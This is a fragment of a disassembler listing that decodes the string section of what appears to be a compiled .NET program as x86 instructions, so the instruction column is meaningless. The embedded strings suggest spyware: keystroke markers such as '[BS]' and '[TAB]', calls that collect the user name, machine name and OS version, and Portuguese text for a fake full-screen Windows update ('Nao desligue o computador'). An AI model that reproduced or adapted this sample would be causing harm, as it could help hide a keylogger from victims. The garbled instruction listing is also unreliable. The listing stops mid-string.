10007338:	65 66 74 00          	gs data16 je 0x1000733c
1000733c:	73 65                	jae    0x100073a3
1000733e:	74 5f                	je     0x1000739f
10007340:	54                   	push   %esp
10007341:	6f                   	outsl  %ds:(%esi),(%dx)
10007342:	70 00                	jo     0x10007344
10007344:	53                   	push   %ebx
10007345:	79 73                	jns    0x100073ba
10007347:	74 65                	je     0x100073ae
10007349:	6d                   	insl   (%dx),%es:(%edi)
1000734a:	2e 43                	cs inc %ebx
1000734c:	6f                   	outsl  %ds:(%esi),(%dx)
1000734d:	6d                   	insl   (%dx),%es:(%edi)
1000734e:	70 6f                	jo     0x100073bf
10007350:	6e                   	outsb  %ds:(%esi),(%dx)
10007351:	65 6e                	outsb  %gs:(%esi),(%dx)
10007353:	74 4d                	je     0x100073a2
10007355:	6f                   	outsl  %ds:(%esi),(%dx)
10007356:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
10007359:	00 43 61             	add    %al,0x61(%ebx)
1000735c:	6e                   	outsb  %ds:(%esi),(%dx)
1000735d:	63 65 6c             	arpl   %esp,0x6c(%ebp)
10007360:	45                   	inc    %ebp
10007361:	76 65                	jbe    0x100073c8
10007363:	6e                   	outsb  %ds:(%esi),(%dx)
10007364:	74 41                	je     0x100073a7
10007366:	72 67                	jb     0x100073cf
10007368:	73 00                	jae    0x1000736a
1000736a:	73 65                	jae    0x100073d1
1000736c:	74 5f                	je     0x100073cd
1000736e:	43                   	inc    %ebx
1000736f:	61                   	popa
10007370:	6e                   	outsb  %ds:(%esi),(%dx)
10007371:	63 65 6c             	arpl   %esp,0x6c(%ebp)
10007374:	00 46 6f             	add    %al,0x6f(%esi)
10007377:	72 6d                	jb     0x100073e6
10007379:	42                   	inc    %edx
1000737a:	6f                   	outsl  %ds:(%esi),(%dx)
1000737b:	72 64                	jb     0x100073e1
1000737d:	65 72 53             	gs jb  0x100073d3
10007380:	74 79                	je     0x100073fb
10007382:	6c                   	insb   (%dx),%es:(%edi)
10007383:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
10007387:	74 5f                	je     0x100073e8
10007389:	46                   	inc    %esi
1000738a:	6f                   	outsl  %ds:(%esi),(%dx)
1000738b:	72 6d                	jb     0x100073fa
1000738d:	42                   	inc    %edx
1000738e:	6f                   	outsl  %ds:(%esi),(%dx)
1000738f:	72 64                	jb     0x100073f5
10007391:	65 72 53             	gs jb  0x100073e7
10007394:	74 79                	je     0x1000740f
10007396:	6c                   	insb   (%dx),%es:(%edi)
10007397:	65 00 46 6f          	add    %al,%gs:0x6f(%esi)
1000739b:	72 6d                	jb     0x1000740a
1000739d:	53                   	push   %ebx
1000739e:	74 61                	je     0x10007401
100073a0:	72 74                	jb     0x10007416
100073a2:	50                   	push   %eax
100073a3:	6f                   	outsl  %ds:(%esi),(%dx)
100073a4:	73 69                	jae    0x1000740f
100073a6:	74 69                	je     0x10007411
100073a8:	6f                   	outsl  %ds:(%esi),(%dx)
100073a9:	6e                   	outsb  %ds:(%esi),(%dx)
100073aa:	00 73 65             	add    %dh,0x65(%ebx)
100073ad:	74 5f                	je     0x1000740e
100073af:	53                   	push   %ebx
100073b0:	74 61                	je     0x10007413
100073b2:	72 74                	jb     0x10007428
100073b4:	50                   	push   %eax
100073b5:	6f                   	outsl  %ds:(%esi),(%dx)
100073b6:	73 69                	jae    0x10007421
100073b8:	74 69                	je     0x10007423
100073ba:	6f                   	outsl  %ds:(%esi),(%dx)
100073bb:	6e                   	outsb  %ds:(%esi),(%dx)
100073bc:	00 50 6f             	add    %dl,0x6f(%eax)
100073bf:	69 6e 74 00 73 65 74 	imul   $0x74657300,0x74(%esi),%ebp
100073c6:	5f                   	pop    %edi
100073c7:	4c                   	dec    %esp
100073c8:	6f                   	outsl  %ds:(%esi),(%dx)
100073c9:	63 61 74             	arpl   %esp,0x74(%ecx)
100073cc:	69 6f 6e 00 53 69 7a 	imul   $0x7a695300,0x6e(%edi),%ebp
100073d3:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
100073d7:	74 5f                	je     0x10007438
100073d9:	53                   	push   %ebx
100073da:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
100073e1:	5f                   	pop    %edi
100073e2:	53                   	push   %ebx
100073e3:	68 6f 77 49 6e       	push   $0x6e49776f
100073e8:	54                   	push   %esp
100073e9:	61                   	popa
100073ea:	73 6b                	jae    0x10007457
100073ec:	62 61 72             	bound  %esp,0x72(%ecx)
100073ef:	00 67 65             	add    %ah,0x65(%edi)
100073f2:	74 5f                	je     0x10007453
100073f4:	54                   	push   %esp
100073f5:	72 61                	jb     0x10007458
100073f7:	6e                   	outsb  %ds:(%esi),(%dx)
100073f8:	73 70                	jae    0x1000746a
100073fa:	61                   	popa
100073fb:	72 65                	jb     0x10007462
100073fd:	6e                   	outsb  %ds:(%esi),(%dx)
100073fe:	74 00                	je     0x10007400
10007400:	50                   	push   %eax
10007401:	61                   	popa
10007402:	69 6e 74 45 76 65 6e 	imul   $0x6e657645,0x74(%esi),%ebp
10007409:	74 48                	je     0x10007453
1000740b:	61                   	popa
1000740c:	6e                   	outsb  %ds:(%esi),(%dx)
1000740d:	64 6c                	fs insb (%dx),%es:(%edi)
1000740f:	65 72 00             	gs jb  0x10007412
10007412:	61                   	popa
10007413:	64 64 5f             	fs fs pop %edi
10007416:	50                   	push   %eax
10007417:	61                   	popa
10007418:	69 6e 74 00 43 6f 6e 	imul   $0x6e6f4300,0x74(%esi),%ebp
1000741f:	74 72                	je     0x10007493
10007421:	6f                   	outsl  %ds:(%esi),(%dx)
10007422:	6c                   	insb   (%dx),%es:(%edi)
10007423:	43                   	inc    %ebx
10007424:	6f                   	outsl  %ds:(%esi),(%dx)
10007425:	6c                   	insb   (%dx),%es:(%edi)
10007426:	6c                   	insb   (%dx),%es:(%edi)
10007427:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
1000742c:	6e                   	outsb  %ds:(%esi),(%dx)
1000742d:	00 67 65             	add    %ah,0x65(%edi)
10007430:	74 5f                	je     0x10007491
10007432:	43                   	inc    %ebx
10007433:	6f                   	outsl  %ds:(%esi),(%dx)
10007434:	6e                   	outsb  %ds:(%esi),(%dx)
10007435:	74 72                	je     0x100074a9
10007437:	6f                   	outsl  %ds:(%esi),(%dx)
10007438:	6c                   	insb   (%dx),%es:(%edi)
10007439:	73 00                	jae    0x1000743b
1000743b:	41                   	inc    %ecx
1000743c:	64 64 00 67 65       	fs add %ah,%fs:0x65(%edi)
10007441:	74 5f                	je     0x100074a2
10007443:	57                   	push   %edi
10007444:	68 69 74 65 00       	push   $0x657469
10007449:	46                   	inc    %esi
1000744a:	6f                   	outsl  %ds:(%esi),(%dx)
1000744b:	6e                   	outsb  %ds:(%esi),(%dx)
1000744c:	74 00                	je     0x1000744e
1000744e:	73 65                	jae    0x100074b5
10007450:	74 5f                	je     0x100074b1
10007452:	46                   	inc    %esi
10007453:	6f                   	outsl  %ds:(%esi),(%dx)
10007454:	6e                   	outsb  %ds:(%esi),(%dx)
10007455:	74 00                	je     0x10007457
10007457:	73 65                	jae    0x100074be
10007459:	74 5f                	je     0x100074ba
1000745b:	41                   	inc    %ecx
1000745c:	75 74                	jne    0x100074d2
1000745e:	6f                   	outsl  %ds:(%esi),(%dx)
1000745f:	53                   	push   %ebx
10007460:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
10007467:	5f                   	pop    %edi
10007468:	42                   	inc    %edx
10007469:	6c                   	insb   (%dx),%es:(%edi)
1000746a:	61                   	popa
1000746b:	63 6b 00             	arpl   %ebp,0x0(%ebx)
1000746e:	46                   	inc    %esi
1000746f:	6f                   	outsl  %ds:(%esi),(%dx)
10007470:	6e                   	outsb  %ds:(%esi),(%dx)
10007471:	74 53                	je     0x100074c6
10007473:	74 79                	je     0x100074ee
10007475:	6c                   	insb   (%dx),%es:(%edi)
10007476:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
1000747a:	6e                   	outsb  %ds:(%esi),(%dx)
1000747b:	74 65                	je     0x100074e2
1000747d:	6e                   	outsb  %ds:(%esi),(%dx)
1000747e:	74 41                	je     0x100074c1
10007480:	6c                   	insb   (%dx),%es:(%edi)
10007481:	69 67 6e 6d 65 6e 74 	imul   $0x746e656d,0x6e(%edi),%esp
10007488:	00 73 65             	add    %dh,0x65(%ebx)
1000748b:	74 5f                	je     0x100074ec
1000748d:	54                   	push   %esp
1000748e:	65 78 74             	gs js  0x10007505
10007491:	41                   	inc    %ecx
10007492:	6c                   	insb   (%dx),%es:(%edi)
10007493:	69 67 6e 00 45 6e 76 	imul   $0x766e4500,0x6e(%edi),%esp
1000749a:	69 72 6f 6e 6d 65 6e 	imul   $0x6e656d6e,0x6f(%edx),%esi
100074a1:	74 00                	je     0x100074a3
100074a3:	67 65 74 5f          	addr16 gs je 0x10007506
100074a7:	55                   	push   %ebp
100074a8:	73 65                	jae    0x1000750f
100074aa:	72 4e                	jb     0x100074fa
100074ac:	61                   	popa
100074ad:	6d                   	insl   (%dx),%es:(%edi)
100074ae:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
100074b2:	74 5f                	je     0x10007513
100074b4:	4d                   	dec    %ebp
100074b5:	61                   	popa
100074b6:	63 68 69             	arpl   %ebp,0x69(%eax)
100074b9:	6e                   	outsb  %ds:(%esi),(%dx)
100074ba:	65 4e                	gs dec %esi
100074bc:	61                   	popa
100074bd:	6d                   	insl   (%dx),%es:(%edi)
100074be:	65 00 54 69 6d       	add    %dl,%gs:0x6d(%ecx,%ebp,2)
100074c3:	65 72 00             	gs jb  0x100074c6
100074c6:	73 65                	jae    0x1000752d
100074c8:	74 5f                	je     0x10007529
100074ca:	49                   	dec    %ecx
100074cb:	6e                   	outsb  %ds:(%esi),(%dx)
100074cc:	74 65                	je     0x10007533
100074ce:	72 76                	jb     0x10007546
100074d0:	61                   	popa
100074d1:	6c                   	insb   (%dx),%es:(%edi)
100074d2:	00 61 64             	add    %ah,0x64(%ecx)
100074d5:	64 5f                	fs pop %edi
100074d7:	54                   	push   %esp
100074d8:	69 63 6b 00 4f 70 65 	imul   $0x65704f00,0x6b(%ebx),%esp
100074df:	72 61                	jb     0x10007542
100074e1:	74 69                	je     0x1000754c
100074e3:	6e                   	outsb  %ds:(%esi),(%dx)
100074e4:	67 53                	addr16 push %ebx
100074e6:	79 73                	jns    0x1000755b
100074e8:	74 65                	je     0x1000754f
100074ea:	6d                   	insl   (%dx),%es:(%edi)
100074eb:	00 67 65             	add    %ah,0x65(%edi)
100074ee:	74 5f                	je     0x1000754f
100074f0:	4f                   	dec    %edi
100074f1:	53                   	push   %ebx
100074f2:	56                   	push   %esi
100074f3:	65 72 73             	gs jb  0x10007569
100074f6:	69 6f 6e 00 42 6f 72 	imul   $0x726f4200,0x6e(%edi),%ebp
100074fd:	64 65 72 53          	fs gs jb 0x10007554
10007501:	74 79                	je     0x1000757c
10007503:	6c                   	insb   (%dx),%es:(%edi)
10007504:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
10007508:	74 5f                	je     0x10007569
1000750a:	42                   	inc    %edx
1000750b:	6f                   	outsl  %ds:(%esi),(%dx)
1000750c:	72 64                	jb     0x10007572
1000750e:	65 72 53             	gs jb  0x10007564
10007511:	74 79                	je     0x1000758c
10007513:	6c                   	insb   (%dx),%es:(%edi)
10007514:	65 00 61 64          	add    %ah,%gs:0x64(%ecx)
10007518:	64 5f                	fs pop %edi
1000751a:	4c                   	dec    %esp
1000751b:	6f                   	outsl  %ds:(%esi),(%dx)
1000751c:	61                   	popa
1000751d:	64 00 61 64          	add    %ah,%fs:0x64(%ecx)
10007521:	64 5f                	fs pop %edi
10007523:	46                   	inc    %esi
10007524:	6f                   	outsl  %ds:(%esi),(%dx)
10007525:	72 6d                	jb     0x10007594
10007527:	43                   	inc    %ebx
10007528:	6c                   	insb   (%dx),%es:(%edi)
10007529:	6f                   	outsl  %ds:(%esi),(%dx)
1000752a:	73 69                	jae    0x10007595
1000752c:	6e                   	outsb  %ds:(%esi),(%dx)
1000752d:	67 00 61 64          	add    %ah,0x64(%bx,%di)
10007531:	64 5f                	fs pop %edi
10007533:	53                   	push   %ebx
10007534:	68 6f 77 6e 00       	push   $0x6e776f
10007539:	41                   	inc    %ecx
1000753a:	70 70                	jo     0x100075ac
1000753c:	6c                   	insb   (%dx),%es:(%edi)
1000753d:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
10007544:	00 52 75             	add    %dl,0x75(%edx)
10007547:	6e                   	outsb  %ds:(%esi),(%dx)
10007548:	00 41 70             	add    %al,0x70(%ecx)
1000754b:	61                   	popa
1000754c:	72 74                	jb     0x100075c2
1000754e:	6d                   	insl   (%dx),%es:(%edi)
1000754f:	65 6e                	outsb  %gs:(%esi),(%dx)
10007551:	74 53                	je     0x100075a6
10007553:	74 61                	je     0x100075b6
10007555:	74 65                	je     0x100075bc
10007557:	00 53 65             	add    %dl,0x65(%ebx)
1000755a:	74 41                	je     0x1000759d
1000755c:	70 61                	jo     0x100075bf
1000755e:	72 74                	jb     0x100075d4
10007560:	6d                   	insl   (%dx),%es:(%edi)
10007561:	65 6e                	outsb  %gs:(%esi),(%dx)
10007563:	74 53                	je     0x100075b8
10007565:	74 61                	je     0x100075c8
10007567:	74 65                	je     0x100075ce
10007569:	00 3c 48             	add    %bh,(%eax,%ecx,2)
1000756c:	69 64 65 3e 62 5f 5f 	imul   $0x315f5f62,0x3e(%ebp,%eiz,2),%esp
10007573:	31 
10007574:	33 00                	xor    (%eax),%eax
10007576:	4d                   	dec    %ebp
10007577:	65 74 68             	gs je  0x100075e2
1000757a:	6f                   	outsl  %ds:(%esi),(%dx)
1000757b:	64 49                	fs dec %ecx
1000757d:	6e                   	outsb  %ds:(%esi),(%dx)
1000757e:	76 6f                	jbe    0x100075ef
10007580:	6b 65 72 00          	imul   $0x0,0x72(%ebp),%esp
10007584:	43                   	inc    %ebx
10007585:	53                   	push   %ebx
10007586:	24 3c                	and    $0x3c,%al
10007588:	3e 39 5f 5f          	cmp    %ebx,%ds:0x5f(%edi)
1000758c:	43                   	inc    %ebx
1000758d:	61                   	popa
1000758e:	63 68 65             	arpl   %ebp,0x65(%eax)
10007591:	64 41                	fs inc %ecx
10007593:	6e                   	outsb  %ds:(%esi),(%dx)
10007594:	6f                   	outsl  %ds:(%esi),(%dx)
10007595:	6e                   	outsb  %ds:(%esi),(%dx)
10007596:	79 6d                	jns    0x10007605
10007598:	6f                   	outsl  %ds:(%esi),(%dx)
10007599:	75 73                	jne    0x1000760e
1000759b:	4d                   	dec    %ebp
1000759c:	65 74 68             	gs je  0x10007607
1000759f:	6f                   	outsl  %ds:(%esi),(%dx)
100075a0:	64 44                	fs inc %esp
100075a2:	65 6c                	gs insb (%dx),%es:(%edi)
100075a4:	65 67 61             	gs addr16 popa
100075a7:	74 65                	je     0x1000760e
100075a9:	31 34 00             	xor    %esi,(%eax,%eax,1)
100075ac:	45                   	inc    %ebp
100075ad:	78 69                	js     0x10007618
100075af:	74 54                	je     0x10007605
100075b1:	68 72 65 61 64       	push   $0x64616572
100075b6:	00 43 6c             	add    %al,0x6c(%ebx)
100075b9:	6f                   	outsl  %ds:(%esi),(%dx)
100075ba:	73 65                	jae    0x10007621
100075bc:	00 67 65             	add    %ah,0x65(%edi)
100075bf:	74 5f                	je     0x10007620
100075c1:	49                   	dec    %ecx
100075c2:	6e                   	outsb  %ds:(%esi),(%dx)
100075c3:	76 6f                	jbe    0x10007634
100075c5:	6b 65 52 65          	imul   $0x65,0x52(%ebp),%esp
100075c9:	71 75                	jno    0x10007640
100075cb:	69 72 65 64 00 49 41 	imul   $0x41490064,0x65(%edx),%esi
100075d2:	73 79                	jae    0x1000764d
100075d4:	6e                   	outsb  %ds:(%esi),(%dx)
100075d5:	63 52 65             	arpl   %edx,0x65(%edx)
100075d8:	73 75                	jae    0x1000764f
100075da:	6c                   	insb   (%dx),%es:(%edi)
100075db:	74 00                	je     0x100075dd
100075dd:	44                   	inc    %esp
100075de:	65 6c                	gs insb (%dx),%es:(%edi)
100075e0:	65 67 61             	gs addr16 popa
100075e3:	74 65                	je     0x1000764a
100075e5:	00 42 65             	add    %al,0x65(%edx)
100075e8:	67 69 6e 49 6e 76 6f 	imul   $0x6b6f766e,0x49(%bp),%ebp
100075ef:	6b 
100075f0:	65 00 00             	add    %al,%gs:(%eax)
100075f3:	00 00                	add    %al,(%eax)
100075f5:	01 00                	add    %eax,(%eax)
100075f7:	09 5b 00             	or     %ebx,0x0(%ebx)
100075fa:	42                   	inc    %edx
100075fb:	00 53 00             	add    %dl,0x0(%ebx)
100075fe:	5d                   	pop    %ebp
100075ff:	00 00                	add    %al,(%eax)
10007601:	0b 5b 00             	or     0x0(%ebx),%ebx
10007604:	54                   	push   %esp
10007605:	00 41 00             	add    %al,0x0(%ecx)
10007608:	42                   	inc    %edx
10007609:	00 5d 00             	add    %bl,0x0(%ebp)
1000760c:	00 03                	add    %al,(%ebx)
1000760e:	0a 00                	or     (%eax),%al
10007610:	00 03                	add    %al,(%ebx)
10007612:	20 00                	and    %al,(%eax)
10007614:	00 0b                	add    %cl,(%ebx)
10007616:	5b                   	pop    %ebx
10007617:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
1000761b:	00 4c 00 5d          	add    %cl,0x5d(%eax,%eax,1)
1000761f:	00 00                	add    %al,(%eax)
10007621:	03 29                	add    (%ecx),%ebp
10007623:	00 00                	add    %al,(%eax)
10007625:	03 21                	add    (%ecx),%esp
10007627:	00 00                	add    %al,(%eax)
10007629:	03 40 00             	add    0x0(%eax),%eax
1000762c:	00 03                	add    %al,(%ebx)
1000762e:	23 00                	and    (%eax),%eax
10007630:	00 03                	add    %al,(%ebx)
10007632:	24 00                	and    $0x0,%al
10007634:	00 03                	add    %al,(%ebx)
10007636:	25 00 00 03 5e       	and    $0x5e030000,%eax
1000763b:	00 00                	add    %al,(%eax)
1000763d:	03 26                	add    (%esi),%esp
1000763f:	00 00                	add    %al,(%eax)
10007641:	03 2a                	add    (%edx),%ebp
10007643:	00 00                	add    %al,(%eax)
10007645:	03 28                	add    (%eax),%ebp
10007647:	00 00                	add    %al,(%eax)
10007649:	03 2b                	add    (%ebx),%ebp
1000764b:	00 00                	add    %al,(%eax)
1000764d:	03 2d 00 01 03 2e    	add    0x2e030100,%ebp
10007653:	00 00                	add    %al,(%eax)
10007655:	03 2f                	add    (%edi),%ebp
10007657:	00 00                	add    %al,(%eax)
10007659:	03 3b                	add    (%ebx),%edi
1000765b:	00 00                	add    %al,(%eax)
1000765d:	03 3a                	add    (%edx),%edi
1000765f:	00 00                	add    %al,(%eax)
10007661:	03 3d 00 00 03 2c    	add    0x2c030000,%edi
10007667:	00 00                	add    %al,(%eax)
10007669:	03 3c 00             	add    (%eax,%eax,1),%edi
1000766c:	00 03                	add    %al,(%ebx)
1000766e:	5f                   	pop    %edi
1000766f:	00 00                	add    %al,(%eax)
10007671:	03 3e                	add    (%esi),%edi
10007673:	00 00                	add    %al,(%eax)
10007675:	03 3f                	add    (%edi),%edi
10007677:	00 00                	add    %al,(%eax)
10007679:	03 7e 00             	add    0x0(%esi),%edi
1000767c:	00 03                	add    %al,(%ebx)
1000767e:	5b                   	pop    %ebx
1000767f:	00 00                	add    %al,(%eax)
10007681:	03 7b 00             	add    0x0(%ebx),%edi
10007684:	00 03                	add    %al,(%ebx)
10007686:	5d                   	pop    %ebp
10007687:	00 00                	add    %al,(%eax)
10007689:	03 7d 00             	add    0x0(%ebp),%edi
1000768c:	00 03                	add    %al,(%ebx)
1000768e:	5c                   	pop    %esp
1000768f:	00 00                	add    %al,(%eax)
10007691:	03 7c 00 00          	add    0x0(%eax,%eax,1),%edi
10007695:	03 27                	add    (%edi),%esp
10007697:	00 01                	add    %al,(%ecx)
10007699:	03 22                	add    (%edx),%esp
1000769b:	00 00                	add    %al,(%eax)
1000769d:	23 42 00             	and    0x0(%edx),%eax
100076a0:	61                   	popa
100076a1:	00 69 00             	add    %ch,0x0(%ecx)
100076a4:	78 00                	js     0x100076a6
100076a6:	61                   	popa
100076a7:	00 6e 00             	add    %ch,0x0(%esi)
100076aa:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
100076ae:	20 00                	and    %al,(%eax)
100076b0:	70 00                	jo     0x100076b2
100076b2:	61                   	popa
100076b3:	00 63 00             	add    %ah,0x0(%ebx)
100076b6:	6f                   	outsl  %ds:(%esi),(%dx)
100076b7:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
100076bb:	00 20                	add    %ah,(%eax)
100076bd:	00 28                	add    %ch,(%eax)
100076bf:	00 00                	add    %al,(%eax)
100076c1:	27                   	daa
100076c2:	20 00                	and    %al,(%eax)
100076c4:	4b                   	dec    %ebx
100076c5:	00 42 00             	add    %al,0x0(%edx)
100076c8:	20 00                	and    %al,(%eax)
100076ca:	2f                   	das
100076cb:	00 20                	add    %ah,(%eax)
100076cd:	00 34 00             	add    %dh,(%eax,%eax,1)
100076d0:	37                   	aaa
100076d1:	00 2e                	add    %ch,(%esi)
100076d3:	00 38                	add    %bh,(%eax)
100076d5:	00 33                	add    %dh,(%ebx)
100076d7:	00 32                	add    %dh,(%edx)
100076d9:	00 20                	add    %ah,(%eax)
100076db:	00 4b 00             	add    %cl,0x0(%ebx)
100076de:	42                   	inc    %edx
100076df:	00 29                	add    %ch,(%ecx)
100076e1:	00 2e                	add    %ch,(%esi)
100076e3:	00 2e                	add    %ch,(%esi)
100076e5:	00 2e                	add    %ch,(%esi)
100076e7:	00 00                	add    %al,(%eax)
100076e9:	05 4f 00 4b 00       	add    $0x4b004f,%eax
100076ee:	00 2b                	add    %ch,(%ebx)
100076f0:	43                   	inc    %ebx
100076f1:	00 6f 00             	add    %ch,0x0(%edi)
100076f4:	6e                   	outsb  %ds:(%esi),(%dx)
100076f5:	00 63 00             	add    %ah,0x0(%ebx)
100076f8:	6c                   	insb   (%dx),%es:(%edi)
100076f9:	00 75 00             	add    %dh,0x0(%ebp)
100076fc:	69 00 64 00 6f 00    	imul   $0x6f0064,(%eax),%eax
10007702:	20 00                	and    %al,(%eax)
10007704:	63 00                	arpl   %eax,(%eax)
10007706:	6f                   	outsl  %ds:(%esi),(%dx)
10007707:	00 6d 00             	add    %ch,0x0(%ebp)
1000770a:	20 00                	and    %al,(%eax)
1000770c:	73 00                	jae    0x1000770e
1000770e:	75 00                	jne    0x10007710
10007710:	63 00                	arpl   %eax,(%eax)
10007712:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
10007716:	73 00                	jae    0x10007718
10007718:	6f                   	outsl  %ds:(%esi),(%dx)
10007719:	00 00                	add    %al,(%eax)
1000771b:	51                   	push   %ecx
1000771c:	25 00 20 00 63       	and    $0x63002000,%eax
10007721:	00 6f 00             	add    %ch,0x0(%edi)
10007724:	6e                   	outsb  %ds:(%esi),(%dx)
10007725:	00 63 00             	add    %ah,0x0(%ebx)
10007728:	6c                   	insb   (%dx),%es:(%edi)
10007729:	00 75 00             	add    %dh,0x0(%ebp)
1000772c:	69 00 64 00 6f 00    	imul   $0x6f0064,(%eax),%eax
10007732:	20 00                	and    %al,(%eax)
10007734:	2d 00 20 00 4e       	sub    $0x4e002000,%eax
10007739:	00 61 00             	add    %ah,0x0(%ecx)
1000773c:	6f                   	outsl  %ds:(%esi),(%dx)
1000773d:	00 20                	add    %ah,(%eax)
1000773f:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
10007743:	00 73 00             	add    %dh,0x0(%ebx)
10007746:	6c                   	insb   (%dx),%es:(%edi)
10007747:	00 69 00             	add    %ch,0x0(%ecx)
1000774a:	67 00 75 00          	add    %dh,0x0(%di)
1000774e:	65 00 20             	add    %ah,%gs:(%eax)
10007751:	00 6f 00             	add    %ch,0x0(%edi)
10007754:	20 00                	and    %al,(%eax)
10007756:	63 00                	arpl   %eax,(%eax)
10007758:	6f                   	outsl  %ds:(%esi),(%dx)
10007759:	00 6d 00             	add    %ch,0x0(%ebp)
1000775c:	70 00                	jo     0x1000775e
1000775e:	75 00                	jne    0x10007760
10007760:	74 00                	je     0x10007762
10007762:	61                   	popa
10007763:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
10007767:	00 72 00             	add    %dh,0x0(%edx)
1000776a:	2e 00 01             	add    %al,%cs:(%ecx)
1000776d:	11 48 00             	adc    %ecx,0x0(%eax)
10007770:	48                   	dec    %eax
10007771:	00 3a                	add    %bh,(%edx)
10007773:	00 6d 00             	add    %ch,0x0(%ebp)
10007776:	6d                   	insl   (%dx),%es:(%edi)
10007777:	00 3a                	add    %bh,(%edx)
10007779:	00 73 00             	add    %dh,0x0(%ebx)
1000777c:	73 00                	jae    0x1000777e
1000777e:	00 05 5d 00 20 00    	add    %al,0x20005d
10007784:	00 17                	add    %dl,(%edi)
10007786:	25 00 20 00 63       	and    $0x63002000,%eax
1000778b:	00 6f 00             	add    %ch,0x0(%edi)
1000778e:	6e                   	outsb  %ds:(%esi),(%dx)
1000778f:	00 63 00             	add    %ah,0x0(%ebx)
10007792:	6c                   	insb   (%dx),%es:(%edi)
10007793:	00 75 00             	add    %dh,0x0(%ebp)
10007796:	69 00 64 00 6f 00    	imul   $0x6f0064,(%eax),%eax
1000779c:	00 19                	add    %bl,(%ecx)
1000779e:	25 00 20 00 63       	and    $0x63002000,%eax
100077a3:	00 6f 00             	add    %ch,0x0(%edi)
100077a6:	6e                   	outsb  %ds:(%esi),(%dx)
100077a7:	00 63 00             	add    %ah,0x0(%ebx)
100077aa:	6c                   	insb   (%dx),%es:(%edi)
100077ab:	00 75 00             	add    %dh,0x0(%ebp)
100077ae:	69 00 64 00 6f 00    	imul   $0x6f0064,(%eax),%eax
100077b4:	2e 00 00             	add    %al,%cs:(%eax)
100077b7:	39 54 00 72          	cmp    %edx,0x72(%eax,%eax,1)
100077bb:	00 61 00             	add    %ah,0x0(%ecx)
100077be:	62 00                	bound  %eax,(%eax)
100077c0:	61                   	popa
100077c1:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
100077c5:	00 61 00             	add    %ah,0x0(%ecx)
100077c8:	6e                   	outsb  %ds:(%esi),(%dx)
100077c9:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
100077cd:	00 20                	add    %ah,(%eax)
100077cf:	00 6e 00             	add    %ch,0x0(%esi)
100077d2:	61                   	popa
100077d3:	00 73 00             	add    %dh,0x0(%ebx)
100077d6:	20 00                	and    %al,(%eax)
100077d8:	61                   	popa
100077d9:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
100077dd:	00 61 00             	add    %ah,0x0(%ecx)
100077e0:	6c                   	insb   (%dx),%es:(%edi)
100077e1:	00 69 00             	add    %ch,0x0(%ecx)
100077e4:	7a 00                	jp     0x100077e6
100077e6:	61                   	popa
100077e7:	00 63 00             	add    %ah,0x0(%ebx)
100077ea:	6f                   	outsl  %ds:(%esi),(%dx)
100077eb:	00 65 00             	add    %ah,0x0(%ebp)
100077ee:	73 00                	jae    0x100077f0
100077f0:	00 1d 53 00 65 00    	add    %bl,0x650053
100077f6:	67 00 6f 00          	add    %ch,0x0(%bx)
100077fa:	65 00 20             	add    %ah,%gs:(%eax)
100077fd:	00 55 00             	add    %dl,0x0(%ebp)
10007800:	49                   	dec    %ecx
10007801:	00 20                	add    %ah,(%eax)
10007803:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
10007807:	00 67 00             	add    %ah,0x0(%edi)
1000780a:	68 00 74 00 00       	push   $0x7400
1000780f:	19 30                	sbb    %esi,(%eax)
10007811:	00 25 00 20 00 63    	add    %ah,0x63002000
10007817:	00 6f 00             	add    %ch,0x0(%edi)
1000781a:	6e                   	outsb  %ds:(%esi),(%dx)
1000781b:	00 63 00             	add    %ah,0x0(%ebx)
1000781e:	6c                   	insb   (%dx),%es:(%edi)
1000781f:	00 75 00             	add    %dh,0x0(%ebp)
10007822:	69 00 64 00 6f 00    	imul   $0x6f0064,(%eax),%eax
10007828:	00 11                	add    %dl,(%ecx)
1000782a:	53                   	push   %ebx
1000782b:	00 65 00             	add    %ah,0x0(%ebp)
1000782e:	67 00 6f 00          	add    %ch,0x0(%bx)
10007832:	65 00 20             	add    %ah,%gs:(%eax)
10007835:	00 55 00             	add    %dl,0x0(%ebp)
10007838:	49                   	dec    %ecx
10007839:	00 00                	add    %al,(%eax)
1000783b:	33 4e 00             	xor    0x0(%esi),%ecx
1000783e:	61                   	popa
1000783f:	00 6f 00             	add    %ch,0x0(%edi)
10007842:	20 00                	and    %al,(%eax)
10007844:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10007848:	73 00                	jae    0x1000784a
1000784a:	6c                   	insb   (%dx),%es:(%edi)
1000784b:	00 69 00             	add    %ch,0x0(%ecx)
1000784e:	67 00 75 00          	add    %dh,0x0(%di)
10007852:	65 00 20             	add    %ah,%gs:(%eax)
10007855:	00 6f 00             	add    %ch,0x0(%edi)
10007858:	20 00                	and    %al,(%eax)
1000785a:	63 00                	arpl   %eax,(%eax)
1000785c:	6f                   	outsl  %ds:(%esi),(%dx)
1000785d:	00 6d 00             	add    %ch,0x0(%ebp)
10007860:	70 00                	jo     0x10007862
10007862:	75 00                	jne    0x10007864
10007864:	74 00                	je     0x10007866
10007866:	61                   	popa
10007867:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
1000786b:	00 72 00             	add    %dh,0x0(%edx)
1000786e:	00 29                	add    %ch,(%ecx)
10007870:	50                   	push   %eax
10007871:	00 72 00             	add    %dh,0x0(%edx)
10007874:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
10007878:	61                   	popa
